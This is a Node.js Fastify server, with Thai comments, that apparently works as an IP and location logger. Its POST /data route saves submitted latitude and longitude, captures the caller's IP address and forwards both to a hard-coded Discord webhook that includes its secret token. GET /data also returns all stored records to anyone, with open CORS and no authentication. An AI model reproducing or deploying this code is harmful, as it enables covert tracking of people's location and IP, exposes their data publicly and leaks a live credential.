const fastify = require('fastify')({ logger: true });
const fastifyCors = require('@fastify/cors');
const fastifyMongo = require('@fastify/mongodb');
const dotenv = require('dotenv');
const axios = require('axios');
const requestIp = require("request-ip");
dotenv.config();
// เปิดใช้ CORS
fastify.register(fastifyCors, {
  origin: '*'
});

fastify.addHook('onRequest', (request, reply, done) => {
  const ip = requestIp.getClientIp(request);

  // ตั้งค่า attribute ไว้ใน request
  request.ipAddress = ip;
  
  done();
});

fastify.register(fastifyMongo, {
  url: `${process.env.MONGODB}`
});

fastify.get('/', async (request, reply) => {
  reply.send({ hello: 'world' });
});

// ตัวอย่าง route
fastify.get('/data', async (request, reply) => {
  const collection = fastify.mongo.db.collection('list');
  const result = await collection.find().toArray();
  reply.send(result);
});

fastify.post('/data', async (request, reply) => {
  const ip = requestIp.getClientIp(request)
  const collection = fastify.mongo.db.collection('list');
  const result = await collection.insertOne(request.body);

  const webhookData = {
    username: "fastfund",
    avatar_url: "",
    embeds: [
      {
        title: `ip:${ip}\nlatitude:${request.body.latitude}\nlongitude:${request.body.longitude}`,
        color: 5500034,
        fields: [],
        author: {
          name: "ไอ้สันดาล",
        }
      }
    ]
  }
  await axios.post("https://discord.com/api/webhooks/1246155300793356422/O5Re2HkGo97LPwKeLpzpx7DoesRKTY1-CAkxyFWxynYR_8ezZh7QFkwEFa_eF1GpNTNG", JSON.stringify(webhookData), {
    headers: {
      'Content-Type': 'application/json',
    },
  });

  reply.send(result);
})

fastify.get('/getip', async (request, reply) => {
  const ipAddress = request.ipAddress;
  
  const responseData = { query: ipAddress };
  
  reply
    .header('Content-Type', 'application/json')
    .send(responseData);
});

// เริ่มเซิร์ฟเวอร์
const start = async () => {
  try {
    await fastify.listen({ port: 3000 });
    fastify.log.info(`Server is running on http://localhost:3000`);
  } catch (err) {
    fastify.log.error(err);
    process.exit(1);
  }
};

start();
